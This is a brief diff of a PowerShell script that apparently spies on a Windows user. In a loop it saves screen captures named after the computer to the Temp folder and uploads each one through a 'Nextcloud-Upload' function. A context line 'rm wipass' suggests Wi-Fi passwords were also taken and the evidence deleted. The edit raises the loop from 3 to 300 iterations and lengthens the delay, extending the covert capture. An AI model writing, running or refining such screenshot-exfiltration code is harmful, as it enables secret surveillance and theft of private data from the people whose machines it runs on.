@@ -65,7 +65,7 @@ rm wipass
 
 
 $i = 0
-while($i -lt 3){
+while($i -lt 300){
 
   Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
@@ -88,7 +88,7 @@ while($i -lt 3){
   
   $i++
   <#start-sleep -Seconds 15#>
-  start-sleep -Seconds 5
+  start-sleep -Seconds 30
  "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture1.png" | Nextcloud-Upload
 }
 
